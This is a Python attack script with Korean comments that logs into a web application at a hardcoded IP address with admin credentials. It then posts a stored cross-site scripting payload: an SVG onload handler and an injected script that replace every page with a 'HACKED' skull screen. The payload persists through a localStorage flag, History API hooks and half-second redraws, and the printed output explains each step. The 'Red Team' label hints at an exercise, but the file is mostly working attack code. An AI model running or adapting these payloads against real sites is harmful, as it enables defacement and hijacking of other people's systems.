#!/usr/bin/env python3
"""
지속적인 Defacement
- SVG onload로 최초 실행
- JavaScript로 현재 페이지 URL 체크
- 다른 페이지로 이동해도 계속 감지
"""

import requests

TARGET = "http://52.78.221.104"
LOGIN_URL = f"{TARGET}/login.php"
NEW_POST_URL = f"{TARGET}/new_post.php"

USERNAME = "admin"
PASSWORD = "admin123"

# 완전 장악 페이로드
DEFACE_COMPLETE = """<svg onload="(function(){
const h='<div style=\\'position:fixed;top:0;left:0;width:100%;height:100%;background:#000;color:#0f0;display:flex;justify-content:center;align-items:center;z-index:9999\\'><div style=\\'text-align:center\\'><pre style=\\'color:#0f0;font-family:monospace\\'>    _.--&quot;&quot;-._ \\n .&quot;         &quot;. \\n/             \\\\ \\n|,  .-.  .-.  ,| \\n| )(__/  \\\\__)( | \\n|/     /\\\\     \\\\| \\n(_     ^^     _) \\n \\\\____________/</pre><h1 style=\\'color:#f00;font-size:3em;animation:b .5s infinite\\'>HACKED</h1><p>SYSTEM COMPROMISED</p><p>[SQL Injection: BYPASSED]<br>[File Upload: EXPLOITED]<br>[XSS: INJECTED]<br>[CSRF: EXECUTED]<br>[Database: COMPROMISED]</p><p>-- Red Team --</p></div></div><style>@keyframes b{0%,100%{opacity:1}50%{opacity:.3}}</style>';
document.body.innerHTML=h;
sessionStorage.setItem('hacked','1');
localStorage.setItem('hacked','1');

// 페이지 변경 감지 (History API)
const o=window.history.pushState;
window.history.pushState=function(){o.apply(window.history,arguments);document.body.innerHTML=h;};

const r=window.history.replaceState;
window.history.replaceState=function(){r.apply(window.history,arguments);document.body.innerHTML=h;};

// 링크 클릭 감지
document.addEventListener('click',function(e){setTimeout(function(){if(sessionStorage.getItem('hacked')==='1')document.body.innerHTML=h;},100);},true);

// 주기적으로 체크
setInterval(function(){if(document.body.innerHTML.indexOf('HACKED')===-1)document.body.innerHTML=h;},1000);
})()"></svg>"""

# 더 간단하고 강력한 버전
DEFACE_ULTIMATE = """<svg onload="(function(){
const showHack=()=>{document.body.innerHTML='<div style=\\'position:fixed;top:0;left:0;width:100%;height:100%;background:#000;color:#0f0;display:flex;justify-content:center;align-items:center;z-index:99999\\'><div style=\\'text-align:center\\'><pre style=\\'color:#0f0;font-family:monospace;font-size:12px\\'>    _.--&quot;&quot;-._ \\n .&quot;         &quot;. \\n/             \\\\ \\n|,  .-.  .-.  ,| \\n| )(__/  \\\\__)( | \\n|/     /\\\\     \\\\| \\n(_     ^^     _) \\n \\\\____________/</pre><h1 style=\\'color:#f00;font-size:3em;animation:b .5s infinite\\'>HACKED</h1><p style=\\'margin:20px 0\\'>SYSTEM COMPROMISED</p><p>[SQL Injection: BYPASSED]<br>[File Upload: EXPLOITED]<br>[XSS: INJECTED]<br>[CSRF: EXECUTED]<br>[Database: COMPROMISED]</p><p style=\\'margin-top:20px\\'>-- Red Team --</p></div></div><style>@keyframes b{0%,100%{opacity:1}50%{opacity:.3}}</style>';};
showHack();
localStorage.setItem('hacked','1');
setInterval(showHack,500);
})()"></svg>

<script>
// 전역 감시 스크립트
(function(){
  if(localStorage.getItem('hacked')==='1'){
    const hack=()=>{
      document.body.innerHTML='<div style=\"position:fixed;top:0;left:0;width:100%;height:100%;background:#000;color:#0f0;display:flex;justify-content:center;align-items:center;z-index:99999\"><div style=\"text-align:center\"><pre style=\"color:#0f0;font-family:monospace;font-size:12px\">    _.--\\\"\\\"-._\\n .\\\"         \\\".\\n/             \\\\\\n|,  .-.  .-.  ,|\\n| )(__/  \\\\__)( |\\n|/     /\\\\     \\\\|\\n(_     ^^     _)\\n \\\\____________/</pre><h1 style=\"color:#f00;font-size:3em;animation:b .5s infinite\">HACKED</h1><p style=\"margin:20px 0\">SYSTEM COMPROMISED</p><p>[SQL Injection: BYPASSED]<br>[File Upload: EXPLOITED]<br>[XSS: INJECTED]<br>[CSRF: EXECUTED]<br>[Database: COMPROMISED]</p><p style=\"margin-top:20px\">-- Red Team --</p></div></div><style>@keyframes b{0%,100%{opacity:1}50%{opacity:.3}}</style>';
    };
    hack();
    setInterval(hack,500);
  }
})();
</script>"""

def login():
    """로그인"""
    session = requests.Session()
    data = {'username': USERNAME, 'password': PASSWORD}
    response = session.post(LOGIN_URL, data=data)

    if 'admin' in response.text or response.status_code == 302:
        print("[+] Login successful")
        return session
    else:
        print("[-] Login failed")
        return None

def post_content(session, content):
    """게시물 작성"""
    data = {'content': content}
    response = session.post(NEW_POST_URL, data=data)

    if response.status_code == 200:
        print("[+] Payload posted")
        return True
    else:
        print("[-] Failed")
        return False

def deploy():
    """배포"""
    print("=" * 60)
    print("💀 완전 장악 Defacement")
    print("=" * 60)
    print()

    session = login()
    if not session:
        return

    print("[*] Deploying ultimate payload...")
    post_content(session, DEFACE_ULTIMATE)

    print()
    print("=" * 60)
    print("✅ 배포 완료!")
    print("=" * 60)
    print()
    print("작동 방식:")
    print("1. SVG onload: 메인 페이지에서 최초 실행")
    print("2. localStorage.setItem('hacked', '1'): 플래그 저장")
    print("3. setInterval: 0.5초마다 화면 강제 교체")
    print("4. <script>: 다른 페이지에서도 localStorage 체크")
    print("5. setInterval: 다른 페이지에서도 0.5초마다 강제 교체")
    print()
    print("→ 메인 페이지를 한번 본 후 어디로 가든 해골!")
    print()
    print("테스트:")
    print(f"1. {TARGET}/ 접속 (메인)")
    print(f"2. {TARGET}/profile.php 접속 → 해골!")
    print(f"3. {TARGET}/file.php 접속 → 해골!")
    print()
    print("💡 해제: localStorage.removeItem('hacked')")
    print()

if __name__ == "__main__":
    deploy()
